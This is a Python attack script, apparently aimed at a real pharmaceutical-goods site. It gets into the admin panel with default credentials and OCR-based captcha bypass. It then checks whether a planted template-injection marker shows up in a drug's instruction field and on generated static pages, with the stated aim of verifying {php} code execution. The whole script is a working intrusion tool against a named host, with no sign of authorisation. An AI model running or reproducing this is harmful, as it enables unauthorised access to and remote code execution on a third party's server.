#!/usr/bin/env python3
"""gz: check goods 17 instructions content + generate its static page + verify {php} exec"""
import urllib.request, urllib.parse, re, http.cookiejar, base64, subprocess, sys

HOST = "http://gz-dichuan.com"
UA = {"User-Agent": "Mozilla/5.0", "Accept": "*/*"}

def ocr(img_bytes):
    b64 = base64.b64encode(img_bytes).decode()
    code = ("import ddddocr,base64; o=ddddocr.DdddOcr(show_ad=False); "
            "print(o.classification(base64.b64decode('%s')))" % b64)
    r = subprocess.run([sys.executable, "-c", code], capture_output=True, timeout=20, cwd="/tmp")
    return r.stdout.decode().strip()

cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

def fetch(url, data=None, timeout=15, headers=None):
    h = {**UA, "Content-Type": "application/x-www-form-urlencoded"}
    if headers: h.update(headers)
    try:
        req = urllib.request.Request(url, data=data.encode() if data else None, headers=h)
        r = op.open(req, timeout=timeout)
        return r.status, r.geturl(), r.read()
    except urllib.error.HTTPError as e:
        return e.code, url, e.read()
    except Exception as ex:
        return 0, url, str(ex).encode()

for attempt in range(10):
    try:
        code, final, body = fetch(HOST + "/index.php?m=admin&c=login&a=index")
        code, final, cap = fetch(HOST + "/index.php?m=admin&c=login&a=vertify",
                                 headers={"Referer": HOST + "/index.php?m=admin&c=login&a=index"})
        cap_text = ocr(cap)
        data = urllib.parse.urlencode({"username": "admin", "password": "admin123", "vertify": cap_text})
        code, final, resp = fetch(HOST + "/index.php?m=admin&c=login&a=login", data=data,
                                  headers={"Referer": HOST + "/index.php?m=admin&c=login&a=index",
                                           "X-Requested-With": "XMLHttpRequest"})
        rt = resp.decode("utf-8", "ignore")
        if "登录成功" in rt or '"status":1' in rt:
            print("login ok")
            break
    except Exception:
        pass

# 1. editdrugs page for id=17 - check instructions content
code, final, body = fetch(HOST + "/index.php?m=admin&c=goods&a=editdrugs&drugs_id=17",
                          headers={"Referer": HOST + "/index.php?m=admin&c=index&a=index"})
bt = body.decode("utf-8", "ignore")
open("/tmp/gz_edit17.html", "w").write(bt)
print("editdrugs 17:", code, "size", len(bt))
print("has GZ_TPPHP_999:", "GZ_TPPHP_999" in bt)
# find drugs_instructions textarea content
m = re.search(r'<textarea[^>]*name=["\']drugs_instructions["\'][^>]*>(.*?)</textarea>', bt, re.S)
if m:
    print("instructions:", repr(m.group(1)[:200]))
# find title
m2 = re.search(r'name=["\']drugs_name["\'][^>]*value=["\']([^"\']*)["\']', bt)
print("drugs_name:", m2.group(1) if m2 else "?")

# 2. try direct dynamic page for goods 17
for u in ["/index.php?m=home&c=goods&a=detail&drugs_id=17", "/index.php?m=home&c=goods&a=index&id=17",
          "/index.php?m=home&c=goods&a=show&id=17", "/index.php?m=home&c=goods&a=info&id=17"]:
    code, final, body = fetch(HOST + u)
    bt2 = body.decode("utf-8", "ignore")
    print("goods dyn %s: %s size=%d has_tpl=%s" % (u, code, len(bt2), "GZ_TPPHP_999" in bt2))

# 3. staticweb generate for 17
code, final, body = fetch(HOST + "/index.php?m=admin&c=other&a=staticweb&id=17",
                          headers={"Referer": HOST + "/index.php?m=admin&c=other&a=staticweb"})
print("staticweb 17:", code, body.decode("utf-8", "ignore")[:300])
